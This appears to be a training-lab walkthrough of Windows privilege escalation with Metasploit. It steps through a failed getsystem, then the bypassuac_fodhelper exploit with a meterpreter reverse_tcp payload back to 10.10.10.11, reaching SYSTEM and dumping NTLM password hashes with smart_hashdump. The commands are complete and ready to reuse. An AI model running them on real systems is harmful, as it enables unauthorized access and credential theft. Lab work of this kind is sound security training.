run post/windows/gather/smart_hashdump (The command fails to dump the passowrd hashes because of insufficient privileges)
privilege escalation:
    Now, we shall try to escalate the privileges by trying to bypass the user account control setting which is blocking you from gaining unrestricted access to the machine. 
    You will now issue a getsystem command that attempts to elevate the user privileges.
    The command issued is getsystem -t 1 which uses the Service - Named Pipe Impersonation (In Memory/Admin) Technique.
    This command also fails to escalate the privileges
    Type background and press Enter to background the meterpreter session
    Type use exploit/windows/local/bypassuac_fodhelper and press Enter. Then type show options and press Enter to show the customizable options for the module
    Type set SESSION 1 (1 is the current meterpreter session which was back grounded in this lab) and press Enter.
    Now that we have configured the exploit, our next step will be to set a payload and configure it.
    Type set payload windows/meterpreter/reverse_tcp and press Enter to set the meterpreter/reverse_tcp payload.
    The next step is to configure this payload. To know all the options you need to configure in the exploit, type show options and press Enter
    To set the LHOST option, type set LHOST 10.10.10.11 and press Enter.
    To set the TARGET option, type set TARGET 0 and press Enter
    You have successfully configured the exploit and payload. Type exploit and press Enter. This begins to exploit the UAC settings in Windows 10 machine
    Check the current User ID status of meterpreter by issuing the getuid command. Type getuid and press Enter
    You will observe that Meterpreter server is still running with normal user privileges
    Re-issue the getsystem command, in attempt to elevate privileges. Type getsystem and press Enter. Type getuid and press Enter.
    The meterpreter session is now running with SYSTEM privileges (NT AUTHORITY\SYSTEM)
    This time, the command has successfully escalated user privileges and returns a message stating got system
Now try to dump the password hashes by typing the command run post/windows/gather/smart_hashdump and press Enter. 
This time, meterpreter successfully extracted the NTLM hashes and displayed them in the terminal window.
